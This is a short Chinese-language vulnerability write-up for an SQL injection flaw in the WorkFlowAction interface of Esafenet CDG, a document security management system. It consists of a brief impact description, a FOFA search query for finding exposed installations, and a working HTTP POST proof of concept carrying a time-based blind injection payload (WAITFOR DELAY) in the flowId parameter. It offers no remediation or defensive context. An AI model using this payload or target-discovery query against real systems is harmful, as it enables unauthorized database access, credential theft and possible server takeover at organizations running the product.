## 亿赛通CDG-WorkFlowAction-sql注入漏洞

## 一、漏洞简介
亿赛通电子文档安全管理系统 WorkFlowAction接口处存在sql注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa
```
app="亿赛通-电子文档安全管理系统" || app="亿赛通-DLP"
```

## POC
```
POST /CDGServer3/3g/WorkFlowAction;Servicelogin HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0

command=Approval&userId=1&fromurl=getTodoList.jsp?curpage=111&flowId=1'%3bWAITFOR+DELAY+'0%3a0%3a5'--
```
